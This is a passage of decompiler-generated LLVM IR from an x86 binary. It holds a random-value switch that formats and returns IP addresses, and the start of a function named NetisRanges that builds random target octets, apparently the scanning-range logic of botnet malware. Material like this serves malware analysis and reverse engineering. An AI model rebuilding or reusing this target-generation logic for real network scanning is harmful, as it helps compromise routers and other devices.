dec_label_pc_804c022:                             ; preds = %dec_label_pc_804bfef, %dec_label_pc_804bff8
  %v12_804c022 = icmp eq i32 %v11_8049ac4, 196
  %v1_804c029 = icmp eq i1 %v12_804c022, false
  br i1 %v1_804c029, label %dec_label_pc_804c055, label %dec_label_pc_804c02b

dec_label_pc_804c02b:                             ; preds = %dec_label_pc_804c022
  %v0_804c02b = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c02b = zext i8 %v0_804c02b to i32
  store i32 %v1_804c02b, i32* @edx, align 4
  %v0_804c037 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c037 = zext i8 %v0_804c037 to i32
  %v2_804c046 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c046, i32* @ebx, align 4
  %v5_804c04d = call i32 @szprintf(i32 %v2_804c046, i32 ptrtoint ([14 x i8]* @global_var_8058f20.215 to i32), i32 %v1_804c037, i32 %v1_804c02b)
  br label %dec_label_pc_804c055

dec_label_pc_804c055:                             ; preds = %dec_label_pc_804c022, %dec_label_pc_804c02b
  %v12_804c055 = icmp eq i32 %v11_8049ac4, 197
  %v1_804c05c = icmp eq i1 %v12_804c055, false
  br i1 %v1_804c05c, label %dec_label_pc_804c088, label %dec_label_pc_804c05e

dec_label_pc_804c05e:                             ; preds = %dec_label_pc_804c055
  %v0_804c05e = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c05e = zext i8 %v0_804c05e to i32
  store i32 %v1_804c05e, i32* @edx, align 4
  %v0_804c06a = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c06a = zext i8 %v0_804c06a to i32
  %v2_804c079 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c079, i32* @ebx, align 4
  %v5_804c080 = call i32 @szprintf(i32 %v2_804c079, i32 ptrtoint ([14 x i8]* @global_var_8058f2e.216 to i32), i32 %v1_804c06a, i32 %v1_804c05e)
  br label %dec_label_pc_804c088

dec_label_pc_804c088:                             ; preds = %dec_label_pc_804c055, %dec_label_pc_804c05e
  %v12_804c088 = icmp eq i32 %v11_8049ac4, 198
  %v1_804c08f = icmp eq i1 %v12_804c088, false
  br i1 %v1_804c08f, label %dec_label_pc_804c0bb, label %dec_label_pc_804c091

dec_label_pc_804c091:                             ; preds = %dec_label_pc_804c088
  %v0_804c091 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c091 = zext i8 %v0_804c091 to i32
  store i32 %v1_804c091, i32* @edx, align 4
  %v0_804c09d = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c09d = zext i8 %v0_804c09d to i32
  %v2_804c0ac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0ac, i32* @ebx, align 4
  %v5_804c0b3 = call i32 @szprintf(i32 %v2_804c0ac, i32 ptrtoint ([14 x i8]* @global_var_8058f3c.217 to i32), i32 %v1_804c09d, i32 %v1_804c091)
  br label %dec_label_pc_804c0bb

dec_label_pc_804c0bb:                             ; preds = %dec_label_pc_804c088, %dec_label_pc_804c091
  %v12_804c0bb = icmp eq i32 %v11_8049ac4, 199
  %v1_804c0c2 = icmp eq i1 %v12_804c0bb, false
  br i1 %v1_804c0c2, label %dec_label_pc_804c0ee, label %dec_label_pc_804c0c4

dec_label_pc_804c0c4:                             ; preds = %dec_label_pc_804c0bb
  %v0_804c0c4 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c0c4 = zext i8 %v0_804c0c4 to i32
  store i32 %v1_804c0c4, i32* @edx, align 4
  %v0_804c0d0 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c0d0 = zext i8 %v0_804c0d0 to i32
  %v2_804c0df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0df, i32* @ebx, align 4
  %v5_804c0e6 = call i32 @szprintf(i32 %v2_804c0df, i32 ptrtoint ([14 x i8]* @global_var_8058f4a.218 to i32), i32 %v1_804c0d0, i32 %v1_804c0c4)
  br label %dec_label_pc_804c0ee

dec_label_pc_804c0ee:                             ; preds = %dec_label_pc_804c0bb, %dec_label_pc_804c0c4
  %v12_804c0ee = icmp eq i32 %v11_8049ac4, 200
  %v1_804c0f5 = icmp eq i1 %v12_804c0ee, false
  br i1 %v1_804c0f5, label %dec_label_pc_804c121, label %dec_label_pc_804c0f7

dec_label_pc_804c0f7:                             ; preds = %dec_label_pc_804c0ee
  %v0_804c0f7 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c0f7 = zext i8 %v0_804c0f7 to i32
  store i32 %v1_804c0f7, i32* @edx, align 4
  %v0_804c103 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c103 = zext i8 %v0_804c103 to i32
  %v2_804c112 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c112, i32* @ebx, align 4
  %v5_804c119 = call i32 @szprintf(i32 %v2_804c112, i32 ptrtoint ([14 x i8]* @global_var_8058f58.219 to i32), i32 %v1_804c103, i32 %v1_804c0f7)
  br label %dec_label_pc_804c121

dec_label_pc_804c121:                             ; preds = %dec_label_pc_804c0ee, %dec_label_pc_804c0f7
  %v12_804c121 = icmp eq i32 %v11_8049ac4, 201
  %v1_804c128 = icmp eq i1 %v12_804c121, false
  br i1 %v1_804c128, label %dec_label_pc_804c154.thread, label %dec_label_pc_804c15d

dec_label_pc_804c154.thread:                      ; preds = %dec_label_pc_804c121
  br label %dec_label_pc_804c187

dec_label_pc_804c15d:                             ; preds = %dec_label_pc_804c121
  %v0_804c12a = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c12a = zext i8 %v0_804c12a to i32
  %v0_804c136 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c136 = zext i8 %v0_804c136 to i32
  %v2_804c145 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c145, i32* @ebx, align 4
  %v5_804c14c = call i32 @szprintf(i32 %v2_804c145, i32 ptrtoint ([14 x i8]* @global_var_8058f66.220 to i32), i32 %v1_804c136, i32 %v1_804c12a)
  %v0_804c15d = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c15d = zext i8 %v0_804c15d to i32
  store i32 %v1_804c15d, i32* @edx, align 4
  %v0_804c169 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c169 = zext i8 %v0_804c169 to i32
  store i32 %v2_804c145, i32* @ebx, align 4
  %v5_804c17f = call i32 @szprintf(i32 %v2_804c145, i32 ptrtoint ([13 x i8]* @global_var_8058f74.221 to i32), i32 %v1_804c169, i32 %v1_804c15d)
  br label %dec_label_pc_804c187

dec_label_pc_804c187:                             ; preds = %dec_label_pc_804c154.thread, %dec_label_pc_804c15d
  %v12_804c187 = icmp eq i32 %v11_8049ac4, 202
  %v1_804c18e = icmp eq i1 %v12_804c187, false
  br i1 %v1_804c18e, label %dec_label_pc_804c1ba, label %dec_label_pc_804c190

dec_label_pc_804c190:                             ; preds = %dec_label_pc_804c187
  %v0_804c190 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c190 = zext i8 %v0_804c190 to i32
  store i32 %v1_804c190, i32* @edx, align 4
  %v0_804c19c = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c19c = zext i8 %v0_804c19c to i32
  %v2_804c1ab = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1ab, i32* @ebx, align 4
  %v5_804c1b2 = call i32 @szprintf(i32 %v2_804c1ab, i32 ptrtoint ([13 x i8]* @global_var_8058f81.222 to i32), i32 %v1_804c19c, i32 %v1_804c190)
  br label %dec_label_pc_804c1ba

dec_label_pc_804c1ba:                             ; preds = %dec_label_pc_804c187, %dec_label_pc_804c190
  %v12_804c1ba = icmp eq i32 %v11_8049ac4, 203
  %v1_804c1c1 = icmp eq i1 %v12_804c1ba, false
  br i1 %v1_804c1c1, label %dec_label_pc_804c1ed, label %dec_label_pc_804c1c3

dec_label_pc_804c1c3:                             ; preds = %dec_label_pc_804c1ba
  %v0_804c1c3 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c1c3 = zext i8 %v0_804c1c3 to i32
  store i32 %v1_804c1c3, i32* @edx, align 4
  %v0_804c1cf = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c1cf = zext i8 %v0_804c1cf to i32
  %v2_804c1de = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1de, i32* @ebx, align 4
  %v5_804c1e5 = call i32 @szprintf(i32 %v2_804c1de, i32 ptrtoint ([13 x i8]* @global_var_8058f8e.223 to i32), i32 %v1_804c1cf, i32 %v1_804c1c3)
  br label %dec_label_pc_804c1ed

dec_label_pc_804c1ed:                             ; preds = %dec_label_pc_804c1ba, %dec_label_pc_804c1c3
  %v12_804c1ed = icmp eq i32 %v11_8049ac4, 204
  %v1_804c1f4 = icmp eq i1 %v12_804c1ed, false
  br i1 %v1_804c1f4, label %dec_label_pc_804c220, label %dec_label_pc_804c1f6

dec_label_pc_804c1f6:                             ; preds = %dec_label_pc_804c1ed
  %v0_804c1f6 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c1f6 = zext i8 %v0_804c1f6 to i32
  store i32 %v1_804c1f6, i32* @edx, align 4
  %v0_804c202 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c202 = zext i8 %v0_804c202 to i32
  %v2_804c211 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c211, i32* @ebx, align 4
  %v5_804c218 = call i32 @szprintf(i32 %v2_804c211, i32 ptrtoint ([13 x i8]* @global_var_8058f9b.224 to i32), i32 %v1_804c202, i32 %v1_804c1f6)
  br label %dec_label_pc_804c220

dec_label_pc_804c220:                             ; preds = %dec_label_pc_804c1ed, %dec_label_pc_804c1f6
  %v12_804c220 = icmp eq i32 %v11_8049ac4, 205
  %v1_804c227 = icmp eq i1 %v12_804c220, false
  br i1 %v1_804c227, label %dec_label_pc_804c253, label %dec_label_pc_804c229

dec_label_pc_804c229:                             ; preds = %dec_label_pc_804c220
  %v0_804c229 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c229 = zext i8 %v0_804c229 to i32
  store i32 %v1_804c229, i32* @edx, align 4
  %v0_804c235 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c235 = zext i8 %v0_804c235 to i32
  %v2_804c244 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c244, i32* @ebx, align 4
  %v5_804c24b = call i32 @szprintf(i32 %v2_804c244, i32 ptrtoint ([13 x i8]* @global_var_8058fa8.225 to i32), i32 %v1_804c235, i32 %v1_804c229)
  br label %dec_label_pc_804c253

dec_label_pc_804c253:                             ; preds = %dec_label_pc_804c220, %dec_label_pc_804c229
  %v12_804c253 = icmp eq i32 %v11_8049ac4, 206
  %v1_804c25a = icmp eq i1 %v12_804c253, false
  br i1 %v1_804c25a, label %dec_label_pc_804c286, label %dec_label_pc_804c25c

dec_label_pc_804c25c:                             ; preds = %dec_label_pc_804c253
  %v0_804c25c = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c25c = zext i8 %v0_804c25c to i32
  store i32 %v1_804c25c, i32* @edx, align 4
  %v0_804c268 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c268 = zext i8 %v0_804c268 to i32
  %v2_804c277 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c277, i32* @ebx, align 4
  %v5_804c27e = call i32 @szprintf(i32 %v2_804c277, i32 ptrtoint ([13 x i8]* @global_var_8058fb5.226 to i32), i32 %v1_804c268, i32 %v1_804c25c)
  br label %dec_label_pc_804c286

dec_label_pc_804c286:                             ; preds = %dec_label_pc_804c253, %dec_label_pc_804c25c
  %v12_804c286 = icmp eq i32 %v11_8049ac4, 207
  %v1_804c28d = icmp eq i1 %v12_804c286, false
  br i1 %v1_804c28d, label %dec_label_pc_804c2b9, label %dec_label_pc_804c28f

dec_label_pc_804c28f:                             ; preds = %dec_label_pc_804c286
  %v0_804c28f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c28f = zext i8 %v0_804c28f to i32
  store i32 %v1_804c28f, i32* @edx, align 4
  %v0_804c29b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c29b = zext i8 %v0_804c29b to i32
  %v2_804c2aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2aa, i32* @ebx, align 4
  %v5_804c2b1 = call i32 @szprintf(i32 %v2_804c2aa, i32 ptrtoint ([14 x i8]* @global_var_8058fc2.227 to i32), i32 %v1_804c29b, i32 %v1_804c28f)
  br label %dec_label_pc_804c2b9

dec_label_pc_804c2b9:                             ; preds = %dec_label_pc_804c286, %dec_label_pc_804c28f
  %v9_804c2b9 = icmp eq i32 %v11_8049ac4, 208
  %v1_804c2c0 = icmp eq i1 %v9_804c2b9, false
  br i1 %v1_804c2c0, label %dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge, label %dec_label_pc_804c2c2

dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge: ; preds = %dec_label_pc_804c2b9
  %.pre101 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804c2ec

dec_label_pc_804c2c2:                             ; preds = %dec_label_pc_804c2b9
  %v0_804c2c2 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804c2c2 = zext i8 %v0_804c2c2 to i32
  store i32 %v1_804c2c2, i32* @edx, align 4
  %v0_804c2ce = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c2ce = zext i8 %v0_804c2ce to i32
  %v2_804c2dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2dd, i32* @ebx, align 4
  %v5_804c2e4 = call i32 @szprintf(i32 %v2_804c2dd, i32 ptrtoint ([13 x i8]* @global_var_8058fd0.228 to i32), i32 %v1_804c2ce, i32 %v1_804c2c2)
  br label %dec_label_pc_804c2ec

dec_label_pc_804c2ec:                             ; preds = %dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge, %dec_label_pc_804c2c2
  %v2_804c2ef.pre-phi = phi i32 [ %.pre101, %dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge ], [ %v2_804c2dd, %dec_label_pc_804c2c2 ]
  %v1_804c2f3 = call i32 @inet_addr(i32 %v2_804c2ef.pre-phi)
  %v3_804c2fb = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804c2fb, i32* @ebx, align 4
  ret i32 %v1_804c2f3

; uselistorder directives
  uselistorder i32 %v2_804c145, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208 }
  uselistorder i32 198, { 1, 0 }
  uselistorder label %dec_label_pc_804c2ec, { 1, 0 }
  uselistorder label %dec_label_pc_804c2b9, { 1, 0 }
  uselistorder label %dec_label_pc_804c286, { 1, 0 }
  uselistorder label %dec_label_pc_804c253, { 1, 0 }
  uselistorder label %dec_label_pc_804c220, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ed, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ba, { 1, 0 }
  uselistorder label %dec_label_pc_804c187, { 1, 0 }
  uselistorder label %dec_label_pc_804c121, { 1, 0 }
  uselistorder label %dec_label_pc_804c0ee, { 1, 0 }
  uselistorder label %dec_label_pc_804c0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804c088, { 1, 0 }
  uselistorder label %dec_label_pc_804c055, { 1, 0 }
  uselistorder label %dec_label_pc_804c022, { 1, 0 }
  uselistorder label %dec_label_pc_804bfef, { 1, 0 }
  uselistorder label %dec_label_pc_804bfbc, { 1, 0 }
  uselistorder label %dec_label_pc_804bf89, { 1, 0 }
  uselistorder label %dec_label_pc_804bf56, { 1, 0 }
  uselistorder label %dec_label_pc_804bf23, { 1, 0 }
  uselistorder label %dec_label_pc_804bef0, { 1, 0 }
  uselistorder label %dec_label_pc_804bebd, { 1, 0 }
  uselistorder label %dec_label_pc_804be8a, { 1, 0 }
  uselistorder label %dec_label_pc_804be57, { 1, 0 }
  uselistorder label %dec_label_pc_804be24, { 1, 0 }
  uselistorder label %dec_label_pc_804bdf1, { 1, 0 }
  uselistorder label %dec_label_pc_804bdbe, { 1, 0 }
  uselistorder label %dec_label_pc_804bd8b, { 1, 0 }
  uselistorder label %dec_label_pc_804bd58, { 1, 0 }
  uselistorder label %dec_label_pc_804bd25, { 1, 0 }
  uselistorder label %dec_label_pc_804bcf2, { 1, 0 }
  uselistorder label %dec_label_pc_804bcbf, { 1, 0 }
  uselistorder label %dec_label_pc_804bc8c, { 1, 0 }
  uselistorder label %dec_label_pc_804bc59, { 1, 0 }
  uselistorder label %dec_label_pc_804bc26, { 1, 0 }
  uselistorder label %dec_label_pc_804bbf3, { 1, 0 }
  uselistorder label %dec_label_pc_804bbc0, { 1, 0 }
  uselistorder label %dec_label_pc_804bb8d, { 1, 0 }
  uselistorder label %dec_label_pc_804bb5a, { 1, 0 }
  uselistorder label %dec_label_pc_804bb27, { 1, 0 }
  uselistorder label %dec_label_pc_804baf4, { 1, 0 }
  uselistorder label %dec_label_pc_804bac1, { 1, 0 }
  uselistorder label %dec_label_pc_804ba8e, { 1, 0 }
  uselistorder label %dec_label_pc_804ba5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ba28, { 1, 0 }
  uselistorder label %dec_label_pc_804b9f5, { 1, 0 }
  uselistorder label %dec_label_pc_804b9c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b98f, { 1, 0 }
  uselistorder label %dec_label_pc_804b95c, { 1, 0 }
  uselistorder label %dec_label_pc_804b929, { 1, 0 }
  uselistorder label %dec_label_pc_804b8f6, { 1, 0 }
  uselistorder label %dec_label_pc_804b8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804b890, { 1, 0 }
  uselistorder label %dec_label_pc_804b85d, { 1, 0 }
  uselistorder label %dec_label_pc_804b82a, { 1, 0 }
  uselistorder label %dec_label_pc_804b7f7, { 1, 0 }
  uselistorder label %dec_label_pc_804b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_804b791, { 1, 0 }
  uselistorder label %dec_label_pc_804b75e, { 1, 0 }
  uselistorder label %dec_label_pc_804b72b, { 1, 0 }
  uselistorder label %dec_label_pc_804b6f8, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c5, { 1, 0 }
  uselistorder label %dec_label_pc_804b692, { 1, 0 }
  uselistorder label %dec_label_pc_804b65f, { 1, 0 }
  uselistorder label %dec_label_pc_804b62c, { 1, 0 }
  uselistorder label %dec_label_pc_804b5f9, { 1, 0 }
  uselistorder label %dec_label_pc_804b5c6, { 1, 0 }
  uselistorder label %dec_label_pc_804b593, { 1, 0 }
  uselistorder label %dec_label_pc_804b560, { 1, 0 }
  uselistorder label %dec_label_pc_804b52d, { 1, 0 }
  uselistorder label %dec_label_pc_804b4fa, { 1, 0 }
  uselistorder label %dec_label_pc_804b4c7, { 1, 0 }
  uselistorder label %dec_label_pc_804b494, { 1, 0 }
  uselistorder label %dec_label_pc_804b461, { 1, 0 }
  uselistorder label %dec_label_pc_804b42e, { 1, 0 }
  uselistorder label %dec_label_pc_804b3fb, { 1, 0 }
  uselistorder label %dec_label_pc_804b3c8, { 1, 0 }
  uselistorder label %dec_label_pc_804b395, { 1, 0 }
  uselistorder label %dec_label_pc_804b362, { 1, 0 }
  uselistorder label %dec_label_pc_804b32f, { 1, 0 }
  uselistorder label %dec_label_pc_804b2fc, { 1, 0 }
  uselistorder label %dec_label_pc_804b2c9, { 1, 0 }
  uselistorder label %dec_label_pc_804b299, { 1, 0 }
  uselistorder label %dec_label_pc_804b269, { 1, 0 }
  uselistorder label %dec_label_pc_804b239, { 1, 0 }
  uselistorder label %dec_label_pc_804b209, { 1, 0 }
  uselistorder label %dec_label_pc_804b1d9, { 1, 0 }
  uselistorder label %dec_label_pc_804b1a9, { 1, 0 }
  uselistorder label %dec_label_pc_804b179, { 1, 0 }
  uselistorder label %dec_label_pc_804b149, { 1, 0 }
  uselistorder label %dec_label_pc_804b119, { 1, 0 }
  uselistorder label %dec_label_pc_804b0e9, { 1, 0 }
  uselistorder label %dec_label_pc_804b0b9, { 1, 0 }
  uselistorder label %dec_label_pc_804b089, { 1, 0 }
  uselistorder label %dec_label_pc_804b059, { 1, 0 }
  uselistorder label %dec_label_pc_804b029, { 1, 0 }
  uselistorder label %dec_label_pc_804aff9, { 1, 0 }
  uselistorder label %dec_label_pc_804afc9, { 1, 0 }
  uselistorder label %dec_label_pc_804af99, { 1, 0 }
  uselistorder label %dec_label_pc_804af69, { 1, 0 }
  uselistorder label %dec_label_pc_804af39, { 1, 0 }
  uselistorder label %dec_label_pc_804af09, { 1, 0 }
  uselistorder label %dec_label_pc_804aed9, { 1, 0 }
  uselistorder label %dec_label_pc_804aea9, { 1, 0 }
  uselistorder label %dec_label_pc_804ae79, { 1, 0 }
  uselistorder label %dec_label_pc_804ae49, { 1, 0 }
  uselistorder label %dec_label_pc_804ae19, { 1, 0 }
  uselistorder label %dec_label_pc_804ade9, { 1, 0 }
  uselistorder label %dec_label_pc_804adb9, { 1, 0 }
  uselistorder label %dec_label_pc_804ad89, { 1, 0 }
  uselistorder label %dec_label_pc_804ad59, { 1, 0 }
  uselistorder label %dec_label_pc_804ad29, { 1, 0 }
  uselistorder label %dec_label_pc_804acf9, { 1, 0 }
  uselistorder label %dec_label_pc_804acc9, { 1, 0 }
  uselistorder label %dec_label_pc_804ac99, { 1, 0 }
  uselistorder label %dec_label_pc_804ac69, { 1, 0 }
  uselistorder label %dec_label_pc_804ac39, { 1, 0 }
  uselistorder label %dec_label_pc_804ac09, { 1, 0 }
  uselistorder label %dec_label_pc_804abd9, { 1, 0 }
  uselistorder label %dec_label_pc_804aba9, { 1, 0 }
  uselistorder label %dec_label_pc_804ab79, { 1, 0 }
  uselistorder label %dec_label_pc_804ab49, { 1, 0 }
  uselistorder label %dec_label_pc_804ab19, { 1, 0 }
  uselistorder label %dec_label_pc_804aae9, { 1, 0 }
  uselistorder label %dec_label_pc_804aab9, { 1, 0 }
  uselistorder label %dec_label_pc_804aa89, { 1, 0 }
  uselistorder label %dec_label_pc_804aa59, { 1, 0 }
  uselistorder label %dec_label_pc_804aa29, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a9c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a999, { 1, 0 }
  uselistorder label %dec_label_pc_804a969, { 1, 0 }
  uselistorder label %dec_label_pc_804a939, { 1, 0 }
  uselistorder label %dec_label_pc_804a909, { 1, 0 }
  uselistorder label %dec_label_pc_804a8d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a879, { 1, 0 }
  uselistorder label %dec_label_pc_804a849, { 1, 0 }
  uselistorder label %dec_label_pc_804a819, { 1, 0 }
  uselistorder label %dec_label_pc_804a7e9, { 1, 0 }
  uselistorder label %dec_label_pc_804a7b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a789, { 1, 0 }
  uselistorder label %dec_label_pc_804a759, { 1, 0 }
  uselistorder label %dec_label_pc_804a729, { 1, 0 }
  uselistorder label %dec_label_pc_804a6f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a6c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a699, { 1, 0 }
  uselistorder label %dec_label_pc_804a669, { 1, 0 }
  uselistorder label %dec_label_pc_804a639, { 1, 0 }
  uselistorder label %dec_label_pc_804a609, { 1, 0 }
  uselistorder label %dec_label_pc_804a5d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a5a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a579, { 1, 0 }
  uselistorder label %dec_label_pc_804a549, { 1, 0 }
  uselistorder label %dec_label_pc_804a519, { 1, 0 }
  uselistorder label %dec_label_pc_804a4e9, { 1, 0 }
  uselistorder label %dec_label_pc_804a4b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a489, { 1, 0 }
  uselistorder label %dec_label_pc_804a459, { 1, 0 }
  uselistorder label %dec_label_pc_804a429, { 1, 0 }
  uselistorder label %dec_label_pc_804a3f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a3c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a399, { 1, 0 }
  uselistorder label %dec_label_pc_804a369, { 1, 0 }
  uselistorder label %dec_label_pc_804a339, { 1, 0 }
  uselistorder label %dec_label_pc_804a309, { 1, 0 }
  uselistorder label %dec_label_pc_804a2d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a2a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a279, { 1, 0 }
  uselistorder label %dec_label_pc_804a249, { 1, 0 }
  uselistorder label %dec_label_pc_804a219, { 1, 0 }
  uselistorder label %dec_label_pc_804a1e9, { 1, 0 }
  uselistorder label %dec_label_pc_804a1b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a189, { 1, 0 }
  uselistorder label %dec_label_pc_804a159, { 1, 0 }
  uselistorder label %dec_label_pc_804a129, { 1, 0 }
  uselistorder label %dec_label_pc_804a0f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a0c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a099, { 1, 0 }
  uselistorder label %dec_label_pc_804a069, { 1, 0 }
  uselistorder label %dec_label_pc_804a039, { 1, 0 }
  uselistorder label %dec_label_pc_804a009, { 1, 0 }
  uselistorder label %dec_label_pc_8049fd9, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa9, { 1, 0 }
  uselistorder label %dec_label_pc_8049f79, { 1, 0 }
  uselistorder label %dec_label_pc_8049f49, { 1, 0 }
  uselistorder label %dec_label_pc_8049f19, { 1, 0 }
  uselistorder label %dec_label_pc_8049ee9, { 1, 0 }
  uselistorder label %dec_label_pc_8049eb9, { 1, 0 }
  uselistorder label %dec_label_pc_8049e89, { 1, 0 }
  uselistorder label %dec_label_pc_8049e59, { 1, 0 }
  uselistorder label %dec_label_pc_8049e29, { 1, 0 }
  uselistorder label %dec_label_pc_8049df9, { 1, 0 }
  uselistorder label %dec_label_pc_8049dc9, { 1, 0 }
  uselistorder label %dec_label_pc_8049d99, { 1, 0 }
  uselistorder label %dec_label_pc_8049d69, { 1, 0 }
  uselistorder label %dec_label_pc_8049d39, { 1, 0 }
  uselistorder label %dec_label_pc_8049d09, { 1, 0 }
  uselistorder label %dec_label_pc_8049cd9, { 1, 0 }
  uselistorder label %dec_label_pc_8049ca9, { 1, 0 }
  uselistorder label %dec_label_pc_8049c79, { 1, 0 }
  uselistorder label %dec_label_pc_8049c49, { 1, 0 }
  uselistorder label %dec_label_pc_8049c19, { 1, 0 }
  uselistorder label %dec_label_pc_8049be9, { 1, 0 }
  uselistorder label %dec_label_pc_8049bb9, { 1, 0 }
  uselistorder label %dec_label_pc_8049b89, { 1, 0 }
  uselistorder label %dec_label_pc_8049b59, { 1, 0 }
  uselistorder label %dec_label_pc_8049b29, { 1, 0 }
  uselistorder label %dec_label_pc_8049af9, { 1, 0 }
}

define i32 @NetisRanges(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c303 = load i32, i32* @edi, align 4
  %v0_804c304 = load i32, i32* @esi, align 4
  %v0_804c305 = load i32, i32* @ebx, align 4
  store i32 %v0_804c305, i32* %stack_var_-16, align 4
  %v1_804c309 = call i32 @random()
  %tmp21 = urem i32 %v1_804c309, 57
  %v1_804c329 = mul nuw nsw i32 %tmp21, 4
  %v2_804c329 = add i32 %v1_804c329, ptrtoint (i32* @global_var_805d100.229 to i32)
  %v3_804c329 = inttoptr i32 %v2_804c329 to i32*
  %v4_804c329 = load i32, i32* %v3_804c329, align 4
  store i32 %v4_804c329, i32* @eax, align 4
  %v1_804c330 = trunc i32 %v4_804c329 to i8
  store i8 %v1_804c330, i8* @global_var_805d497.27, align 1
  %v2_804c335 = call i32 @random()
  %v2_804c345 = ashr i32 %v2_804c335, 31
  %v2_804c348 = zext i32 %v2_804c335 to i64
  %v4_804c348 = zext i32 %v2_804c345 to i64
  %v5_804c348 = mul nuw i64 %v4_804c348, 4294967296
  %v6_804c348 = or i64 %v5_804c348, %v2_804c348
  %v10_804c348 = srem i64 %v6_804c348, 255
  %v11_804c348 = trunc i64 %v10_804c348 to i32
  store i32 %v11_804c348, i32* @eax, align 4
  %v1_804c34c = trunc i64 %v10_804c348 to i8
  store i8 %v1_804c34c, i8* @global_var_805d498.28, align 8
  %v0_804c351 = call i32 @random()
  %v2_804c361 = ashr i32 %v0_804c351, 31
  %v2_804c364 = zext i32 %v0_804c351 to i64
